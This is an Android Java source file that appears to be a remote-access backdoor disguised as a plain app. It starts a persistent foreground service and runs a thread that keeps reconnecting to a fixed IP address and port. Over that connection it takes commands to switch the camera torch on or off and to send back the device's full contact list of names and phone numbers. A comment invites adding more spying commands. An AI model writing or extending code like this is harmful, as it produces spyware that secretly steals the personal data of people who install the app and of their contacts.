package com.you.app;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.camera2.CameraManager;
import android.os.Bundle;
import android.provider.ContactsContract;

import androidx.appcompat.app.AppCompatActivity;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionDeniedResponse;
import com.karumi.dexter.listener.PermissionGrantedResponse;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.single.PermissionListener;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {

    public static CameraManager cameraManager;
    public static String cameraId;

    // Instance reference for AppThread
    public static MainActivity instance;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        instance = this;

        // Permission check for CAMERA
        Dexter.withContext(this)
                .withPermission(Manifest.permission.CAMERA)
                .withListener(new PermissionListener() {
                    @Override
                    public void onPermissionGranted(PermissionGrantedResponse response) {
                        initCamera();
                    }

                    @Override
                    public void onPermissionDenied(PermissionDeniedResponse response) { }

                    @Override
                    public void onPermissionRationaleShouldBeShown(PermissionRequest permission, PermissionToken token) { }
                }).check();

        // Start foreground service
        startForegroundService(new Intent(this, KeepServiceAlive.class));
    }

    // Initialize camera for torch
    private void initCamera() {
        try {
            cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            cameraId = cameraManager.getCameraIdList()[0];
        } catch (Exception e) { }
    }

    // Torch functions
    public static void torchON() {
        try {
            cameraManager.setTorchMode(cameraId, true);
        } catch (Exception e) { }
    }

    public static void torchOFF() {
        try {
            cameraManager.setTorchMode(cameraId, false);
        } catch (Exception e) { }
    }

    // Contacts function
    public String listContacts() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
        );
        while (c != null && c.moveToNext()) {
            String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String number = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            sb.append(name).append(" : ").append(number).append("\n");
        }
        if (c != null) c.close();
        return sb.toString();
    }

    // Future helper functions can go here
}

class AppThread extends Thread {

    @Override
    public void run() {
        Socket socket = null;
        while (true) {
            try {
                InetSocketAddress addr = new InetSocketAddress("192.168.29.55", 4443);
                socket = new Socket();
                socket.connect(addr, 3000);

                OutputStream out = socket.getOutputStream();
                out.write("[*] Connected\n".getBytes());

                InputStream in = socket.getInputStream();
                BufferedReader br = new BufferedReader(new InputStreamReader(in));
                String line;

                while ((line = br.readLine()) != null) {

                    if (line.equalsIgnoreCase("FLASH_ON")) {
                        MainActivity.torchON();
                        out.write("[*] Torch ON\n".getBytes());
                    } else if (line.equalsIgnoreCase("FLASH_OFF")) {
                        MainActivity.torchOFF();
                        out.write("[*] Torch OFF\n".getBytes());
                    } else if (line.equalsIgnoreCase("list_contacts")) {
                        // Call contacts function from MainActivity
                        String contacts = MainActivity.instance.listContacts();
                        out.write(contacts.getBytes());
                    }

                    // ðŸŒŸ Future commands can be added here
                    // Example: "GET_APP_LIST", "DATA_USAGE", etc.
                }

            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            } finally {
                try { if (socket != null) socket.close(); } catch (Exception e) {}
            }
        }
    }
}
